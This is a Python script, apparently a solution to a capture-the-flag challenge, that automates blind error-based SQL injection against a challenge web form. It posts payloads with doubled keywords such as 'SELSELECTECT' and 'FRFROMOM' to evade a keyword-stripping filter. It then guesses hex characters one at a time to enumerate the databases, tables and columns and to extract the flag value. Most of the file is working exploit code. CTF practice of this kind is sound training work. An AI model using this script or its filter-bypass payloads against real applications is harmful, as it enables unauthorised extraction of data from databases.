import requests, time
from typing import Callable
__all__ = 'deep_error_search string_to_hexstring pretty_print_hex_list'.split()



def string_to_hexstring(string:str) -> str:
  out = ''.join([hex(ord(s))[2:] for s in string])
  return out


def pretty_print_hex_list(prefix='', hex_strings:list[str]=[]) -> list[str]:

  out = []
  for h in hex_strings:
    try:
      out.append(bytearray.fromhex(h).decode())
    except:
      out.append(h)

  print(prefix, out)
  return out


def _search(send_request: Callable, value:str) -> list[str]:
  s = []
  for l in '0123456789abcdef':
    if send_request(value + l):
      s.append(value + l)
  return s


def deep_error_search(send_request: Callable, starting_value='') -> list[str]:

  # convert starting_value in hexadecimal form
  starting_value = ''.join([hex(ord(i))[2:] for i in starting_value])

  timer = time.time()

  results = []
  broken = []
  no_repetition = [starting_value]
  out = [starting_value]
  while len(out) > 0:
    pretty_print_hex_list('out:', out)
    pretty_print_hex_list('results:', results)
    current = out.pop()
    res = _search(send_request, current)
    if res == []:
      try:
        print('RESULT:', bytes.fromhex(current))
        results.append(current)
      except:
        print('BROKEN:', current, bytes.fromhex(current[:-1]))
        broken.append(current[:-1])
    for i in res:
      if i not in no_repetition:
        out.append(i)
        no_repetition.append(i)

  # print('no_repetition', no_repetition)
  # pretty_print_hex_list('out', out)

  timer = time.time() - timer
  print("deep execution time:", timer)

  pretty_print_hex_list('BROKEN:', broken)
  return pretty_print_hex_list('RESULTS:', results)



if __name__ == '__main__':

  # db
  # QUERY = "' AND (SELSELECTECT 0/0 FRFROMOM information_schema.schemata WHEWHERERE HEX(schema_name) LIKE '{}%') -- "
  # table
  # QUERY = "' AND (SELSELECTECT 0/0 FRFROMOM information_schema.tables WHEWHERERE HEX(table_name) LIKE '{}%' AND table_schema = DATABASE()) -- "
  # column
  # QUERY = "' AND (SELSELECTECT 0/0 FRFROMOM information_schema.columns WHEWHERERE HEX(column_name) LIKE '{}%' AND table_name = 'qua_trovi_la_tua_flflagag') -- "
  # value
  QUERY = "' AND (SELSELECTECT 0/0 FRFROMOM qua_trovi_la_tua_flflagag WHEWHERERE HEX(la_flflagag_sta_qua) LIKE '{0}%') -- ab{0}"
  # QUERY = ""

  # SUBSTRING('SQL Tutorial',1,IF((SELSELECTECT 1=0 FRFROMOM information_schema.columns WHEWHERERE HEX(column_name) LIKE '5c%' AND table_name = 'qua_trovi_la_tua_flflagag'),1,500)) -- 



  def send_request(value:str):

    url = "http://no-time.challs.olicyber.it:80/"
    data = {"email": QUERY.format(value)}
    r = requests.post(url, data=data)
    # print(r.text)
    return ('Fatal error' in r.text)
    

  print(deep_error_search(send_request, ''))